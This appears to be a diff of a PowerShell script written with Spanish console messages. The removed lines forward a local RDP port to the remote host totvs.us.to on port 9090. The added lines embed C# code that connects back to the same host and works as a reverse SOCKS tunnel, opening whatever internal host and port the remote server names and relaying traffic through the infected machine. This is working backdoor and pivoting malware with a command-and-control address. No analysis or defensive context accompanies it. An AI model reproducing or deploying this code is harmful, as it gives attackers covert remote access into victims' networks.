@@ -1,39 +1,212 @@
-$ClientControl = New-Object System.Net.Sockets.TcpClient
-$ClientControl.Connect("totvs.us.to",9090)
-Write-Host "[+] Servidor Conectado"
-$ServerStream = $ClientControl.GetStream()
-$Buffers = New-Object byte[] 65536
-$MSGDatos = New-Object byte[] 65536
-$MSGData = New-Object byte[] 65536
+$Server = "totvs.us.to"
 
-while($true)
+
+
+Add-Type @"
+using System;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading.Tasks;
+
+
+
+public class SocksClient
 {
-    $MSGRead = $ServerStream.Read($Buffers,0,$Buffers.Length)
-    if($MSGRead -gt 0)
-    {
-        $MSGCommands =[System.Text.Encoding]::UTF8.GetString($Buffers,0,$MSGRead).Trim()
 
-        if($MSGCommands.Trim() -eq "Hola")
-        {
-       Write-Host "[+] Abriendo RDP Local"
 
-$RdpControl = New-Object System.Net.Sockets.TcpClient
-$RdpControl.Connect("127.0.0.4",3389)
-$RdpStream = $RdpControl.GetStream()
+static async Task Pipe(NetworkStream a, NetworkStream b)
+{
 
-while($true)
-            {
-                if($ServerStream.DataAvailable)
-                {
-                    $Rolst = $ServerStream.Read($MSGDatos,0,$MSGDatos.Length)
-                    $RdpStream.Write($MSGDatos,0,$Rolst)
-                }
-                if($RdpStream.DataAvailable)
-                {
-                    $Mastr = $RdpStream.Read($MSGData,0,$MSGData.Length)
-                    $ServerStream.Write($MSGData,0,$Mastr)
-                }
-            }
-        }
-    }
+byte[] buffer = new byte[65536];
+
+
+try
+{
+
+while(true)
+{
+
+int n =
+await a.ReadAsync(buffer,0,buffer.Length);
+
+
+
+if(n <= 0)
+break;
+
+
+
+await b.WriteAsync(buffer,0,n);
+
+
 }
+
+}
+catch
+{
+
+}
+
+
+try { a.Close(); } catch{}
+try { b.Close(); } catch{}
+
+
+}
+
+
+
+
+static async Task Relay(NetworkStream a, NetworkStream b)
+{
+
+
+await Task.WhenAny(
+
+Pipe(a,b),
+Pipe(b,a)
+
+);
+
+
+}
+
+
+
+
+public static async Task Start(string server)
+{
+
+
+TcpClient tunnel =
+new TcpClient();
+
+
+
+Console.WriteLine("[*] Conectando tunnel");
+
+
+
+await tunnel.ConnectAsync(server,9090);
+
+
+
+Console.WriteLine("[+] Tunnel conectado");
+
+
+
+NetworkStream tunnelStream =
+tunnel.GetStream();
+
+
+
+byte[] buffer =
+new byte[65536];
+
+
+
+while(true)
+{
+
+
+int n =
+await tunnelStream.ReadAsync(buffer,0,buffer.Length);
+
+
+
+if(n <= 0)
+break;
+
+
+
+string request =
+Encoding.ASCII.GetString(buffer,0,n);
+
+
+
+Console.WriteLine("[+] Destino: "+request);
+
+
+
+string[] p =
+request.Split(':');
+
+
+
+string host =
+p[0];
+
+
+
+int port =
+int.Parse(p[1]);
+
+
+
+// abrir destino
+
+
+TcpClient remote =
+new TcpClient();
+
+
+
+await remote.ConnectAsync(host,port);
+
+
+
+Console.WriteLine(
+"[+] Conectado "+
+host+
+":"+
+port
+);
+
+
+
+NetworkStream remoteStream =
+remote.GetStream();
+
+
+
+// responder OK SOCKS
+
+
+byte[] ok =
+{
+0x05,
+0x00,
+0x00,
+0x01,
+0,0,0,0,
+0,
+0
+};
+
+
+
+await tunnelStream.WriteAsync(ok,0,ok.Length);
+
+
+
+// relay
+
+
+await Relay(
+tunnelStream,
+remoteStream
+);
+
+
+
+}
+
+
+}
+
+
+}
+"@
+
+
+[SocksClient]::Start($Server).GetAwaiter().GetResult()
